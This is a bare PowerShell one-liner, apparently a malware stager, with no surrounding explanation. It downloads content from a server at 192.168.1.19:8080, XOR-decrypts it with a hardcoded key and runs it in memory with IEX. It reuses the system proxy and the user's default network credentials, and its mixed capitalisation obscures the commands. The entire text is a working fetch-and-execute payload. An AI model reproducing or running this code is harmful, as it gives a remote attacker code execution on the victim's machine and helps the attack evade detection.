
$Wc=NEw-ObjEct SysTEM.Net.WebClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeADErs.AdD('User-Agent',$u);$Wc.PROXy = [SySTEM.NEt.WEbReQuEsT]::DeFaUlTWEBProxy;$wc.PrOxy.CREDEntIalS = [SysTEM.NeT.CREDENTIALCaChe]::DEfAuLtNETWoRkCREDENTIaLs;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[cHAR[]]$b=([ChAR[]]($Wc.DOwnLOadStRiNG("http://192.168.1.19:8080/index.asp")))|%{$_-bXOr$k[$i++%$k.LENgth]};IEX ($b-JoiN'')

